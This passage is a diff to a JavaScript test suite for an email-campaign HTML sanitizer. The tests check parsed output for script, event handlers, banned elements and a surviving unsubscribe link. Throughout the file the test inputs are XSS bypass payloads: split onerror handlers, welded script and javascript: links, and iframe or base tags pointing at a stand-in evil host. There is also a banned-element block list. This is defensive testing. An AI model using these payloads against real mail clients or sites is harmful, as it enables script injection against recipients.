@@ -5,12 +5,237 @@ import {
   sanitizeCampaignHtml,
   renderHostCampaignHtml,
   resolveHostRecipients,
+  markupTagSpans,
 } from './host-campaign-email'
 
 // ---------------------------------------------------------------------------
 // sanitizeCampaignHtml — host-authored body HTML is the ONLY unescaped input
 // in a host campaign email; every dangerous construct must be stripped.
 // ---------------------------------------------------------------------------
+// ---------------------------------------------------------------------------
+// PARSED-DOCUMENT ASSERTIONS (round-6 finding 5).
+//
+// Every handler/scheme assertion in this file used to be a SUBSTRING TEST on
+// the sanitizer's string output, and that is exactly why 182 green tests
+// shipped a critical XSS: `<img src=x onerror="alert(document.domain);'<a'">`
+// sanitized to ITSELF, and `not.toContain('onerror')` was never written for
+// the payloads that got through because nobody thought of them. A parser is
+// not fooled the same way — it answers "does this document contain a live
+// event-handler attribute", which is the question that matters — so the checks
+// below walk parse5's tree (and jsdom's, where a second opinion is worth
+// having) and the string assertions that remain are about FIDELITY, not
+// safety.
+//
+// This is the same invariant the round-6 fuzz harness runs, kept here so the
+// suite and the fuzz cannot drift apart.
+// ---------------------------------------------------------------------------
+const PARSED_UNSUB = 'https://crm.test/unsubscribe/host/parsed.sig'
+const PARSED_HOST = { name: 'Acme Events', sender_name: 'Acme Team' }
+
+// Nothing in this set may exist as an ELEMENT in a rendered campaign. `meta`
+// is here too: the shell writes its own charset and the sanitizer re-emits one
+// canonical viewport, and no other meta may survive (metaAllowed below).
+const BANNED_ELEMENTS = new Set([
+  'script', 'iframe', 'object', 'embed', 'form', 'base', 'link', 'svg', 'math',
+  'select', 'option', 'optgroup', 'textarea', 'title', 'noscript', 'noframes',
+  'noembed', 'meta', 'plaintext', 'xmp', 'template',
+])
+// An unsubscribe anchor inside one of these is TEXT, not a link.
+const INERT_ANCESTORS = new Set([
+  'script', 'style', 'textarea', 'title', 'template', 'select', 'noscript',
+  'plaintext', 'xmp', 'noframes', 'noembed',
+])
+const URL_ATTRS = new Set(['href', 'src', 'poster', 'formaction', 'background', 'action', 'xlink:href'])
+const OK_SCHEMES = new Set(['http', 'https', 'mailto', 'tel', 'cid'])
+const URL_IGNORED = /[\u0000-\u0020\u00a0]/g
+
+function decodeForCheck(value) {
+  return String(value)
+    .replace(/&#x([0-9a-f]+);?/gi, (_, h) => { const c = parseInt(h, 16); return Number.isFinite(c) && c <= 0x10ffff ? String.fromCodePoint(c) : '' })
+    .replace(/&#(\d+);?/g, (_, d) => { const c = parseInt(d, 10); return Number.isFinite(c) && c <= 0x10ffff ? String.fromCodePoint(c) : '' })
+    .replace(/&(colon|tab|newline|amp|quot|apos);?/gi, (_, n) => ({ colon: ':', tab: '\t', newline: '\n', amp: '&', quot: '"', apos: "'" }[n.toLowerCase()]))
+}
+
+function metaAllowed(attrs) {
+  const m = new Map(attrs.map((a) => [a.name, a.value]))
+  if (m.size === 1 && String(m.get('charset') || '').toLowerCase() === 'utf-8') return true
+  return m.size === 2 && m.get('name') === 'viewport' && m.get('content') === 'width=device-width, initial-scale=1'
+}
+
+/** parse5's tree, flattened to { tag, attrs:[{name,value}], text, children }. */
+function parse5Tree(html) {
+  const conv = (n) => ({
+    tag: n.tagName ? n.tagName.toLowerCase() : null,
+    attrs: (n.attrs || []).map((a) => ({ name: (a.prefix ? `${a.prefix}:` : '') + a.name, value: a.value })),
+    text: n.nodeName === '#text' ? n.value : undefined,
+    children: (n.childNodes || []).map(conv),
+  })
+  return conv(parse(html))
+}
+
+/** jsdom's tree in the same shape, so ONE checker can run against both. */
+function jsdomTree(html) {
+  const conv = (n) => ({
+    tag: n.nodeType === 1 ? n.tagName.toLowerCase() : null,
+    attrs: n.nodeType === 1 ? Array.from(n.attributes).map((a) => ({ name: a.name, value: a.value })) : [],
+    text: n.nodeType === 3 ? n.data : undefined,
+    children: Array.from(n.childNodes || []).map(conv),
+  })
+  return conv(new JSDOM(html).window.document)
+}
+
+/**
+ * THE INVARIANT, as a list of problems (empty = clean). One rendered campaign
+ * must contain:
+ *   - EXACTLY ONE `a[href]` equal to the unsubscribe URL, with no inert
+ *     ancestor (a link inside script/style/title/textarea/template/select/
+ *     noscript is text, not a link, and every round of this review has shipped
+ *     a payload that turned it into one);
+ *   - no banned element, and no meta beyond the shell's charset and the one
+ *     canonical viewport;
+ *   - NO attribute whose name starts with `on` — junk names like `on<p`
+ *     included, because a name a regex cannot describe is still an attribute;
+ *   - no URL attribute whose DECODED scheme is outside the allowlist;
+ *   - no style attribute carrying expression()/javascript:/@import or an
+ *     unparked remote url(), after decoding;
+ *   - no `<` or `>` in a style element's body, which is what stops a restored
+ *     stylesheet closing its own element.
+ */
+function invariantProblems(tree, unsub = PARSED_UNSUB) {
+  const problems = []
+  let unsubCount = 0
+  const walk = (node, stack) => {
+    if (node.tag) {
+      const t = node.tag
+      // The shell's own <title> in <head> holds the ESCAPED subject and is not
+      // host-supplied.
+      const shellTitle = t === 'title' && stack.length === 2 && stack[0] === 'html' && stack[1] === 'head'
+      if (BANNED_ELEMENTS.has(t) && !shellTitle) {
+        if (t !== 'meta') problems.push(`banned element ${t}`)
+        else if (!metaAllowed(node.attrs)) problems.push(`banned meta ${JSON.stringify(node.attrs)}`)
+      }
+      for (const a of node.attrs) {
+        const n = a.name.toLowerCase()
+        if (n.startsWith('on')) problems.push(`on* attribute ${n}=${a.value}`)
+        if (URL_ATTRS.has(n)) {
+          const d = decodeForCheck(a.value).replace(URL_IGNORED, '')
+          const m = /^([a-z][a-z0-9+.-]*):/i.exec(d)
+          if (m && !OK_SCHEMES.has(m[1].toLowerCase())) problems.push(`bad scheme ${n}=${a.value}`)
+        }
+        if (n === 'style') {
+          const v = decodeForCheck(a.value).toLowerCase()
+          if (v.includes('expression(') || v.includes('javascript:') || v.includes('@import')) problems.push(`live css ${a.value.slice(0, 90)}`)
+          if (/url\(\s*['"]?https?:/i.test(v)) problems.push(`remote css url ${a.value.slice(0, 90)}`)
+        }
+      }
+      if (t === 'a' && node.attrs.some((a) => a.name.toLowerCase() === 'href' && a.value === unsub)) {
+        unsubCount++
+        for (const anc of stack) if (INERT_ANCESTORS.has(anc)) problems.push(`unsubscribe link inside ${anc}`)
+      }
+      if (t === 'style') {
+        const body = (node.children || []).map((c) => c.text || '').join('')
+        if (/[<>]/.test(body)) problems.push(`angle bracket in style body ${body.slice(0, 90)}`)
+      }
+    }
+    const next = node.tag ? [...stack, node.tag] : stack
+    for (const c of node.children || []) walk(c, next)
+  }
+  walk(tree, [])
+  if (unsubCount !== 1) problems.push(`expected exactly 1 live unsubscribe anchor, found ${unsubCount}`)
+  return problems
+}
+
+/** Render one host body BOTH ways: shell-wrapped, and as a full document. */
+function renderBothPaths(bodyHtml, unsub = PARSED_UNSUB) {
+  return {
+    shell: renderHostCampaignHtml({ host: PARSED_HOST, subject: 'Subject <b>', bodyHtml, unsubscribeUrl: unsub }),
+    doc: renderHostCampaignHtml({
+      host: PARSED_HOST,
+      subject: 'Subject <b>',
+      bodyHtml: `<!DOCTYPE html><html><body><p>hi</p>${bodyHtml}</body></html>`,
+      unsubscribeUrl: unsub,
+    }),
+  }
+}
+
+/**
+ * Assert the full parsed invariant on BOTH render paths with parse5, and (when
+ * asked) with jsdom as an independent second parser.
+ */
+function expectSafeBothPaths(bodyHtml, { jsdom = false, unsub = PARSED_UNSUB } = {}) {
+  const rendered = renderBothPaths(bodyHtml, unsub)
+  for (const [path, html] of Object.entries(rendered)) {
+    expect({ path, problems: invariantProblems(parse5Tree(html), unsub) }).toEqual({ path, problems: [] })
+    if (jsdom) expect({ path, problems: invariantProblems(jsdomTree(html), unsub) }).toEqual({ path, problems: [] })
+  }
+  return rendered
+}
+
+/**
+ * EXACTLY ONE live unsubscribe anchor, with no inert ancestor.
+ *
+ * "At least one" was the old shape of this check, and it cannot see a document
+ * that ships the footer twice; no ancestor check meant an anchor inside
+ * <script>/<style>/<title>/<textarea>/<template>/<select>/<noscript> — text,
+ * not a link — counted as a pass. Both are failure modes this file has shipped.
+ */
+function hasExactlyOneLiveUnsubLink(html, href) {
+  let count = 0
+  let inert = 0
+  const walk = (node, stack) => {
+    if (node.tag === 'a' && node.attrs.some((a) => a.name.toLowerCase() === 'href' && a.value === href)) {
+      count++
+      if (stack.some((t) => INERT_ANCESTORS.has(t))) inert++
+    }
+    const next = node.tag ? [...stack, node.tag] : stack
+    for (const c of node.children || []) walk(c, next)
+  }
+  walk(parse5Tree(html), [])
+  return count === 1 && inert === 0
+}
+
+/** Every attribute in a parsed fragment, as { tag, name, value }. */
+function parsedAttributes(html) {
+  const found = []
+  const walk = (node) => {
+    for (const a of node.attrs || []) found.push({ tag: node.tag, name: a.name.toLowerCase(), value: a.value })
+    for (const c of node.children || []) walk(c)
+  }
+  walk(parse5Tree(html))
+  return found
+}
+
+/**
+ * Every attribute a browser would treat as an event handler — which means
+ * every attribute whose NAME STARTS WITH `on`, junk names included. `on<p` is
+ * not a handler any browser fires, but it is an attribute the sanitizer was
+ * never able to see, and the same blindness is what let a real `onerror`
+ * through (round-6 findings 1 and 4).
+ */
+function handlerAttrs(html) {
+  return parsedAttributes(html).filter((a) => a.name.startsWith('on'))
+}
+
+/** Every URL attribute whose DECODED scheme is outside the allowlist. */
+function badSchemeAttrs(html) {
+  return parsedAttributes(html).filter((a) => {
+    if (!URL_ATTRS.has(a.name)) return false
+    const m = /^([a-z][a-z0-9+.-]*):/i.exec(decodeForCheck(a.value).replace(URL_IGNORED, ''))
+    return !!m && !OK_SCHEMES.has(m[1].toLowerCase())
+  })
+}
+
+/** Every element name in a parsed fragment. */
+function parsedElements(html) {
+  const found = []
+  const walk = (node) => {
+    if (node.tag) found.push(node.tag)
+    for (const c of node.children || []) walk(c)
+  }
+  walk(parse5Tree(html))
+  return found
+}
+
 describe('sanitizeCampaignHtml', () => {
   it('strips <script> tags WITH their content', () => {
     const out = sanitizeCampaignHtml('<p>hi</p><script>alert("x")</script><p>bye</p>')
@@ -367,6 +592,28 @@ describe('renderHostCampaignHtml — full-document (Unlayer) campaigns', () => {
     expect(out).not.toContain('onclick')
     expect(out).toContain('Unsubscribe')
   })
+  it('the footer goes at the REAL </body>, not one inside a comment (round-6 fuzz)', () => {
+    // `renderHostCampaignHtml` used a regex to find `</body>`, so a host body
+    // containing `<!--</body>-->` had the ENTIRE mandatory footer injected
+    // inside that comment: the source still said "Unsubscribe" and the parsed
+    // document had no anchor at all. The insertion point comes from the
+    // tokenizer walk now, which knows a comment from an end tag.
+    expectSafeBothPaths('<p>Sale</p><!--</body>-->')
+    // The same one indirection out: a `</body>` inside an Outlook conditional
+    // block is comment data to every other client.
+    expectSafeBothPaths('<!--[if mso]><div></body><![endif]--><p>x</p>')
+    // And with the trap FIRST in a full document, which is the shape the fuzz
+    // generated.
+    const html = renderHostCampaignHtml({
+      host: { name: 'Acme', sender_name: 'Acme' },
+      subject: 's',
+      bodyHtml: '<!DOCTYPE html><html><body><!--</body>--><p>hi</p></body></html>',
+      unsubscribeUrl: PARSED_UNSUB,
+    })
+    expect(invariantProblems(parse5Tree(html))).toEqual([])
+    expect(invariantProblems(jsdomTree(html))).toEqual([])
+  })
+
   it('plain fragments keep the branded shell', () => {
     const out = renderHostCampaignHtml({ host, subject: 'S', bodyHtml: '<p>Hi</p>', unsubscribeUrl: 'https://x/u/t' })
     expect(out).toContain('border-radius:12px')
@@ -752,38 +999,57 @@ describe('sanitizeCampaignHtml — on* boundary + placeholder-forgery regression
 // fixed canonical meta tag.
 // ---------------------------------------------------------------------------
 describe('sanitizeCampaignHtml — viewport-meta splice bypass (security re-review)', () => {
-  const oneMeta = (out) => expect(out.match(/<meta/g) || []).toHaveLength(1)
+  // COUNTED IN THE PARSED DOCUMENT, not in the string. With whole-tag
+  // scanning `<scr<meta name=viewport>` is ONE element named `scr<meta` whose
+  // second attribute happens to be spelled `viewport` — the text `<meta`
+  // appears twice more in the source and neither is an element. Counting
+  // substrings answered the wrong question.
+  const oneMeta = (out) => expect(parsedElements(out).filter((t) => t === 'meta')).toHaveLength(1)
 
   it('cannot weld a live <script> back together through split viewport metas', () => {
-    const out = sanitizeCampaignHtml(
-      '<meta name=viewport><scr<meta name=viewport>ipt>window.__pwned=1</scr<meta name=viewport>ipt>'
-    )
-    expect(out).not.toContain('<script')
-    expect(out).not.toContain('__pwned')
+    // ROUND 6 CHANGED WHAT THIS PAYLOAD IS. A `<` inside a tag is an ordinary
+    // character, so `<scr<meta name=viewport>` is ONE element named `scr<meta`
+    // — there is nothing to weld any more, and `window.__pwned=1` is visible
+    // text. The assertion that survives is the one that always mattered: no
+    // <script> element, one meta, and a live unsubscribe link on both paths.
+    const body = '<meta name=viewport><scr<meta name=viewport>ipt>window.__pwned=1</scr<meta name=viewport>ipt>'
+    const out = sanitizeCampaignHtml(body)
+    expect(parsedElements(out)).not.toContain('script')
     oneMeta(out)
+    expectSafeBothPaths(body)
   })
 
   it('cannot weld a live onerror= handler back together through a split viewport meta', () => {
-    const out = sanitizeCampaignHtml('<meta name=viewport><img src=x on<meta name=viewport>error=alert(1)>')
-    expect(out).not.toMatch(/onerror/i)
-    expect(out).not.toContain('alert(1)')
+    // The `on<meta` here is now an ATTRIBUTE NAME on the <img>, and it is
+    // deleted for starting with `on` — which is the round-6 rule that also
+    // kills `on<p` and a valueless `onerror`. `error=alert(1)>` is text.
+    const body = '<meta name=viewport><img src=x on<meta name=viewport>error=alert(1)>'
+    const out = sanitizeCampaignHtml(body)
+    expect(handlerAttrs(out)).toEqual([])
     oneMeta(out)
+    expectSafeBothPaths(body)
   })
 
   it('cannot weld a javascript: href back together through a split viewport meta', () => {
-    const out = sanitizeCampaignHtml('<meta name=viewport><a href="java<meta name=viewport>script:alert(1)">x</a>')
+    // The `<meta …>` is inside a QUOTED value, so it is part of the href and
+    // not a tag at all. `java<meta name=viewport>script:alert(1)` has no
+    // scheme (a scheme cannot contain `<`), which makes it a relative URL — a
+    // browser navigates to a 404, not to script. Asserted on the PARSED href.
+    const body = '<meta name=viewport><a href="java<meta name=viewport>script:alert(1)">x</a>'
+    const out = sanitizeCampaignHtml(body)
     expect(out).not.toMatch(/javascript:/i)
-    expect(out).toContain('href="#"')
+    expect(badSchemeAttrs(out)).toEqual([])
     oneMeta(out)
+    expectSafeBothPaths(body)
   })
 
   it('cannot weld an <iframe> back together through split viewport metas', () => {
-    const out = sanitizeCampaignHtml(
-      '<meta name=viewport><ifra<meta name=viewport>me src="https://evil"></ifra<meta name=viewport>me>'
-    )
-    expect(out).not.toMatch(/<\/?iframe/i)
-    expect(out).not.toContain('evil')
+    // One element named `ifra<meta`, which is not an iframe and frames nothing.
+    const body = '<meta name=viewport><ifra<meta name=viewport>me src="https://evil"></ifra<meta name=viewport>me>'
+    const out = sanitizeCampaignHtml(body)
+    expect(parsedElements(out)).not.toContain('iframe')
     oneMeta(out)
+    expectSafeBothPaths(body)
   })
 
   it('still keeps exactly one canonical viewport meta when several are authored', () => {
@@ -796,14 +1062,19 @@ describe('sanitizeCampaignHtml — viewport-meta splice bypass (security re-revi
     expect(out).not.toContain('content="b"')
   })
 
-  it('a GENUINE <style> block inside an open tag is dropped, not restored there', () => {
-    // The forged-placeholder version of this is covered above; a real <style>
-    // element is lifted to a placeholder, so the restore has to refuse to put
-    // it back inside another tag's attribute list.
-    const out = sanitizeCampaignHtml('<a href="https://ok" <style>onerror=alert(1)</style>>hi</a>')
-    expect(out).not.toMatch(/<a[^>]*<style/)
-    expect(out).not.toMatch(/<a[^>]*onerror\s*=/i)
+  it('a <style> written inside an open tag is an ATTRIBUTE NAME, and no style element is created', () => {
+    // Round 5 read this as a partial `<a` plus a real <style> element, lifted
+    // the stylesheet out and then had to refuse to restore it into the
+    // attribute list. Round 6 reads what a browser reads: `<style` is the
+    // second attribute name of the anchor, the tag ends at the first `>`, and
+    // `onerror=alert(1)` is TEXT. Nothing is lifted, so nothing can be
+    // restored in the wrong place.
+    const body = '<a href="https://ok" <style>onerror=alert(1)</style>>hi</a>'
+    const out = sanitizeCampaignHtml(body)
+    expect(parsedElements(out)).not.toContain('style')
+    expect(handlerAttrs(out)).toEqual([])
     expect(out).toContain('hi')
+    expectSafeBothPaths(body)
   })
 
   it('strips <base>, which would re-point every relative URL in the message', () => {
@@ -901,10 +1172,19 @@ describe('sanitizeCampaignHtml — stranded-placeholder splice bypass (third sec
     viewport: '<meta name="viewport" content="w">',
   }
 
-  const styleTagsBalanced = (out) => {
-    const open = (out.match(/<style\b/gi) || []).length
-    const close = (out.match(/<\/style\b/gi) || []).length
-    expect(open).toBe(close)
+  // Balance is asserted on the PARSED document now: every <style> the output
+  // contains has to be an element parse5 opens AND closes, which is a stronger
+  // statement than counting `<style` substrings — and a substring count reads
+  // `<sty<style>` (one element named `sty<style`) as an unclosed stylesheet.
+  const noUnclosedStyle = (out) => {
+    const html = `${out}<span id="footer-would-go-here">FOOTER</span>`
+    const problems = []
+    const walk = (node, stack) => {
+      if (node.tag === 'span' && stack.some((t) => INERT_ANCESTORS.has(t))) problems.push(stack.join('>'))
+      for (const c of node.children || []) walk(c, node.tag ? [...stack, node.tag] : stack)
+    }
+    walk(parse5Tree(html), [])
+    expect(problems).toEqual([])
   }
 
   const PAYLOADS = [
@@ -912,8 +1192,8 @@ describe('sanitizeCampaignHtml — stranded-placeholder splice bypass (third sec
       name: 'an on* handler sawn in half',
       html: (d) => `<img src=x on${d}error=alert(1)>`,
       check: (out) => {
+        expect(handlerAttrs(out)).toEqual([])
         expect(out).not.toMatch(/onerror/i)
-        expect(out).not.toContain('alert(1)')
       },
     },
     {
@@ -921,7 +1201,7 @@ describe('sanitizeCampaignHtml — stranded-placeholder splice bypass (third sec
       html: (d) => `<scr${d}ipt>alert(1)`,
       check: (out) => {
         expect(out).not.toContain('<script')
-        expect(out).not.toMatch(/<scr/i)
+        expect(parsedElements(out)).not.toContain('script')
       },
     },
     {
@@ -929,7 +1209,7 @@ describe('sanitizeCampaignHtml — stranded-placeholder splice bypass (third sec
       html: (d) => `<a href="javascri${d}pt:alert(1)">x</a>`,
       check: (out) => {
         expect(out).not.toMatch(/javascript:/i)
-        expect(out).toContain('href="#"')
+        expect(badSchemeAttrs(out)).toEqual([])
       },
     },
     {
@@ -937,7 +1217,7 @@ describe('sanitizeCampaignHtml — stranded-placeholder splice bypass (third sec
       html: (d) => `<ifra${d}me src="https://evil.example/">`,
       check: (out) => {
         expect(out).not.toMatch(/<\/?iframe/i)
-        expect(out).not.toContain('evil.example')
+        expect(parsedElements(out)).not.toContain('iframe')
       },
     },
     {
@@ -945,7 +1225,7 @@ describe('sanitizeCampaignHtml — stranded-placeholder splice bypass (third sec
       html: (d) => `<ba${d}se href="//evil.example/">`,
       check: (out) => {
         expect(out).not.toMatch(/<base\b/i)
-        expect(out).not.toContain('evil.example')
+        expect(parsedElements(out)).not.toContain('base')
       },
     },
     {
@@ -953,10 +1233,10 @@ describe('sanitizeCampaignHtml — stranded-placeholder splice bypass (third sec
       html: (d) => `<p>Sale!</p><sty${d}le>`,
       check: (out) => {
         expect(out).toContain('<p>Sale!</p>')
-        // The footer is appended AFTER this sanitizer runs, so an unclosed
-        // <style> here eats it. Balance is the assertion that matters.
-        styleTagsBalanced(out)
-        expect(out).not.toMatch(/<style/i)
+        // The footer is appended AFTER this sanitizer runs, so anything the
+        // output leaves open swallows it. Asked of a parser, with a stand-in
+        // footer appended: nothing may end up inside a raw-text element.
+        noUnclosedStyle(out)
       },
     },
   ]
@@ -964,23 +1244,22 @@ describe('sanitizeCampaignHtml — stranded-placeholder splice bypass (third sec
   for (const [deviceName, device] of Object.entries(DEVICES)) {
     for (const payload of PAYLOADS) {
       it(`${payload.name} — spliced with a ${deviceName} placeholder, NO decoy meta`, () => {
-        payload.check(sanitizeCampaignHtml(payload.html(device)))
+        const body = payload.html(device)
+        payload.check(sanitizeCampaignHtml(body))
+        // …and the whole parsed invariant, on both render paths: whatever the
+        // splice produced, it is not a live handler, not a banned element, and
+        // it has not cost the message its unsubscribe link.
+        expectSafeBothPaths(body)
       })
     }
   }
 
   it('the same payloads never reassemble when the footer is appended after them', () => {
     // renderHostCampaignHtml injects the footer AFTER sanitization; the
-    // unclosed-<style> payload is the one that could hide it.
-    const html = renderHostCampaignHtml({
-      host: { name: 'Acme', sender_name: 'Acme' },
-      subject: 's',
-      bodyHtml: '<p>Sale!</p><sty<style>a{color:red}</style>le>',
-      unsubscribeUrl: 'https://x/u/t',
-    })
-    expect(html).toContain('Unsubscribe')
-    expect(html).toContain('attended an event or joined the mailing list')
-    styleTagsBalanced(html)
+    // unclosed-<style> payload is the one that could hide it. Asserted with a
+    // parser, because "the source contains the word Unsubscribe" is precisely
+    // the assertion that cannot see a swallowed footer.
+    expectSafeBothPaths('<p>Sale!</p><sty<style>a{color:red}</style>le>', { jsdom: true })
   })
 })
 
@@ -994,15 +1273,17 @@ describe('sanitizeCampaignHtml — quote-aware open-tag scan (third security rev
     expect(out).toBe('5 < 6 and <style>a{color:red}</style> here')
   })
 
-  it('a `>` inside a quoted attribute value does NOT close the tag — no <style> is restored inside it', () => {
+  it('a `>` inside a quoted attribute value does NOT close the tag — no <style> element is created inside it', () => {
     // FALSE NEGATIVE in the old test: the `>` in title="a>b" moved
     // lastIndexOf('>') past the `<`, so a placeholder genuinely inside the tag
     // read as outside it and a real <style> element was restored into the
-    // attribute list.
+    // attribute list. The `<style>` here is inside a QUOTED VALUE, so it is
+    // never an element at all — the style attribute's own scrub takes the
+    // angle brackets out of the CSS (scrubCss ends with a `[<>]` strip) and
+    // what is left is an invalid declaration, not markup.
     const out = sanitizeCampaignHtml('<img title="a>b" style="<style>a{color:red}</style>">')
+    expect(parsedElements(out)).not.toContain('style')
     expect(out).not.toContain('<style')
-    expect(out).not.toContain('color:red')
-    expect(out).not.toMatch(/<img[^>]*<style/)
     expect(out).toContain('title="a>b"')
   })
 
@@ -1049,18 +1330,19 @@ describe('sanitizeCampaignHtml — inline-style CSS budget is per pass, not per 
 })
 
 describe('sanitizeCampaignHtml — the outer fixed point fails CLOSED', () => {
-  // A drop→strip→drop chain that costs one outer round per link. Each link is
-  //   `<lin` + <inner> + <style>…</style> + `k>`
-  // The inner construct collapses to nothing, splicing `<lin` onto `k>` to
-  // make a fresh `<link>` — which the NEXT round strips, stranding the next
-  // placeholder, and so on. Depth n needs n+2 rounds, so anything past
-  // MAX_OUTER_PASSES - 2 exhausts the bound.
-  const S = '<style>a{}</style>'
-  const chain = (n) => {
-    let s = `<lin${S}k>`
-    for (let i = 2; i <= n; i++) s = `<lin${s}${S}k>`
-    return s
-  }
+  // A WELD CHAIN that costs one strip pass per link, which is the shape that
+  // survives round 6. `'<'.repeat(n) + 'link>'.repeat(n)`: only the LAST `<`
+  // is followed by a letter, so exactly one `<link>` is a tag; deleting it
+  // hands the `<` before it a fresh `link>` and the next pass deletes that
+  // one, n times over. (The round-5 chain sawed a `<link>` in half with a
+  // <style> element — `<lin<style>a{}</style>k>` — and that is no longer a
+  // chain at all: a `<` inside a tag is an ordinary character, so the whole
+  // thing is ONE element named `lin<style` and nothing welds.)
+  //
+  // The bound is MAX_INNER_PASSES x MAX_OUTER_PASSES: ten linear passes per
+  // round, twenty rounds, and a round that still changed something is a round
+  // whose splice has not been re-scanned.
+  const chain = (n) => '<'.repeat(n) + 'link>'.repeat(n)
 
   it('a chain that converges inside the bound sanitizes normally and keeps the rest of the body', () => {
     const warn = vi.spyOn(console, 'warn').mockImplementation(() => {})
@@ -1081,7 +1363,7 @@ describe('sanitizeCampaignHtml — the outer fixed point fails CLOSED', () => {
     // operator sees and reports.
     const warn = vi.spyOn(console, 'warn').mockImplementation(() => {})
     try {
-      const out = sanitizeCampaignHtml(`${chain(25)}<p>keep me</p>`)
+      const out = sanitizeCampaignHtml(`${chain(400)}<p>keep me</p>`)
       expect(out).toBe('')
       expect(warn).toHaveBeenCalledTimes(1)
       expect(String(warn.mock.calls[0][0])).toMatch(/failed closed/)
@@ -1180,11 +1462,18 @@ describe('sanitizeCampaignHtml — unterminated comments (round-4)', () => {
     expect(sanitizeCampaignHtml('<p>k</p><!-- a --!>')).toBe('<p>k</p><!-- a --!>')
   })
 
-  it('the tail deletion cannot weld a new construct together (nothing follows it)', () => {
+  it('a comment opener INSIDE a tag is part of the tag name, and welds nothing', () => {
+    // `<scr<!--ipt>` is ONE element named `scr<!--ipt` to parse5 and to every
+    // browser: the `<!--` is not a comment opener, because inside a tag only
+    // `>` ends the tag. Round 5 cut the tag at the `<!--`, took it for a
+    // dangling comment and tail-deleted; the deletion could not weld anything
+    // (nothing follows a tail deletion), but the reading was wrong, and the
+    // same wrong reading in a quoted value was the round-6 critical.
     const out = sanitizeCampaignHtml('<p>ok</p><scr<!--ipt>alert(1)')
     expect(out).not.toContain('<script')
-    expect(out).not.toContain('alert(1)')
+    expect(parsedElements(out)).not.toContain('script')
     expect(out).toContain('<p>ok</p>')
+    expectSafeBothPaths('<p>ok</p><scr<!--ipt>alert(1)')
   })
 })
 
@@ -1217,16 +1506,19 @@ describe('sanitizeCampaignHtml — Outlook conditional comments survive (round-4
 })
 
 describe('sanitizeCampaignHtml — quotes only open a value after `=` (round-4)', () => {
-  it("a stray quote in attribute-name position does not flip the scan out of the tag", () => {
+  it('a stray quote in attribute-name position does not flip the scan out of the tag', () => {
     // Tracking parity on EVERY quote desynchronised the scan from a real
     // tokenizer: here the first `"` (part of the unquoted value `x"`) opened a
-    // phantom value, the `>` inside `y="z>AAA"` then read as closing the <a>,
-    // and the placeholder that is genuinely still inside the tag scanned as
-    // ordinary text — so a <style> element was restored into the attribute
-    // list of a live <a>.
-    const out = sanitizeCampaignHtml('<a href=x" y="z>AAA" BBB=<style>a{color:red}</style> >L')
-    expect(out).not.toMatch(/<a[^>]*<style/)
-    expect(out).not.toContain('color:red')
+    // phantom value and the `>` inside `y="z>AAA"` then read as closing the
+    // <a>. The spec states it without a special case: a quote opens a value
+    // only in BEFORE_ATTR_VALUE. The whole run is ONE anchor whose third
+    // attribute value is the unquoted text `<style>a{color:red}</style>`, so no
+    // stylesheet exists to be restored anywhere.
+    const body = '<a href=x" y="z>AAA" BBB=<style>a{color:red}</style> >L'
+    const out = sanitizeCampaignHtml(body)
+    expect(parsedElements(out)).not.toContain('style')
+    expect(parsedElements(out)).toContain('a')
+    expectSafeBothPaths(body)
   })
 
   it('a normally-quoted attribute value still shields its > from the scan', () => {
@@ -1238,8 +1530,12 @@ describe('sanitizeCampaignHtml — quotes only open a value after `=` (round-4)'
   })
 
   it('whitespace between = and the quote still opens a value', () => {
+    // `title = "a>b"` is a quoted value, so its `>` does not end the tag and
+    // the `alt` value that follows is inert text inside an attribute — not a
+    // <style> element.
     const out = sanitizeCampaignHtml('<img title = "a>b" alt="<style>a{color:red}</style>">')
-    expect(out).not.toContain('<style')
+    expect(parsedElements(out)).not.toContain('style')
+    expect(parsedAttributes(out).map((a) => a.name).sort()).toEqual(['alt', 'title'])
   })
 })
 
@@ -1256,15 +1552,19 @@ describe('renderHostCampaignHtml — the unsubscribe link survives as a LIVE DOM
   const UNSUB = 'https://crm.test/unsubscribe/host/tok.sig'
   const host = { name: 'Acme Events', sender_name: 'Acme Team' }
 
-  /** Walk the parse5 tree for an <a> whose href is exactly `href`. */
-  function hasLiveUnsubLink(html, href = UNSUB) {
-    const walk = (node) => {
-      if (node.tagName === 'a' && (node.attrs || []).some((a) => a.name === 'href' && a.value === href)) return true
-      for (const child of node.childNodes || []) if (walk(child)) return true
-      return false
-    }
-    return walk(parse(html))
-  }
+  // EXACTLY ONE live anchor, with clean ancestors (round-6 finding 5): "at
+  // least one" cannot see a duplicated footer, and no ancestor check counted a
+  // link inside <script>/<title>/<textarea> as live.
+  const hasLiveUnsubLink = (html, href = UNSUB) => hasExactlyOneLiveUnsubLink(html, href)
+
+  it('the helper says NO to a DUPLICATED footer and to an inert ancestor', () => {
+    // The two things "at least one live anchor" could never see.
+    const link = `<a href="${UNSUB}">Unsubscribe</a>`
+    expect(hasLiveUnsubLink(`<p>x</p>${link}`)).toBe(true)
+    expect(hasLiveUnsubLink(`<p>x</p>${link}${link}`)).toBe(false)
+    expect(hasLiveUnsubLink(`<p>x</p><title>${link}</title>`)).toBe(false)
+    expect(hasLiveUnsubLink(`<p>x</p><textarea>${link}</textarea>`)).toBe(false)
+  })
 
   it('the helper is a real detector — it says NO when the footer is swallowed', () => {
     // Negative control. Without it, nine green assertions below would prove
@@ -1465,14 +1765,7 @@ describe('renderHostCampaignHtml — an UNTERMINATED tag cannot eat the footer (
   const UNSUB = 'https://crm.test/unsubscribe/host/tok.sig'
   const host = { name: 'Acme Events', sender_name: 'Acme Team' }
 
-  function hasLiveUnsubLink(html, href = UNSUB) {
-    const walk = (node) => {
-      if (node.tagName === 'a' && (node.attrs || []).some((a) => a.name === 'href' && a.value === href)) return true
-      for (const child of node.childNodes || []) if (walk(child)) return true
-      return false
-    }
-    return walk(parse(html))
-  }
+  const hasLiveUnsubLink = (html, href = UNSUB) => hasExactlyOneLiveUnsubLink(html, href)
   const shellOf = (bodyHtml) => renderHostCampaignHtml({ host, subject: 's', bodyHtml, unsubscribeUrl: UNSUB })
   const docOf = (bodyHtml) => renderHostCampaignHtml({
     host, subject: 's', bodyHtml: `<!DOCTYPE html><html><body><p>hi</p>${bodyHtml}</body></html>`, unsubscribeUrl: UNSUB,
@@ -1528,10 +1821,19 @@ describe('renderHostCampaignHtml — an UNTERMINATED tag cannot eat the footer (
     // to EOF inside the tag and DROPS it — while the sanitizer kept it, and
     // the footer (appended in the shell, injected before `</body>` in the
     // document) landed inside that open quote. Both paths lost the anchor.
+    // ROUND 6: this particular body is no longer unterminated. `='"<!--[if` is
+    // an ATTRIBUTE NAME (an `=` in before-attribute-name position starts a
